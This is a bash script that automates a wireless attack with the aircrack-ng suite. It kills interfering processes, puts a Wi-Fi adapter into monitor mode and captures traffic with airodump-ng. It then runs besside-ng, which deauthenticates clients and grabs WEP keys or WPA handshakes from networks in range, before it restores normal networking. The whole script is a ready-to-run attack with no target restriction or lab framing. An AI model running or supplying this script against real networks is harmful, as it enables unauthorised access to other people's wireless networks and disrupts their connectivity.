#!/bin/bash

clear
ifconfig
echo "-------------------------"
iwconfig
echo "-------------------------"


port="wlxe894f6236dc9"
monport="wlan0mon" 



echo "[1]:airmon-ng check kill"
airmon-ng check kill

echo "[2]: airmon-ng start $port"
airmon-ng start $port # Start monitoring $port

echo "[3]: airodump-ng $monport -w capture"
  
airodump-ng $monport -w capture

echo "[4]: besside-ng $monport"
besside-ng $monport

echo "[5]: airmon-ng stop $monport # Stop monitor"
#Stop monitor status and return to manger status
airmon-ng stop $monport

echo "[6]: service networking restart"
service networking restart

echo "[7]: service network-manager restart"
service network-manager restart

ifconfig wlp1s0 down && ifconfig wlp1s0 up
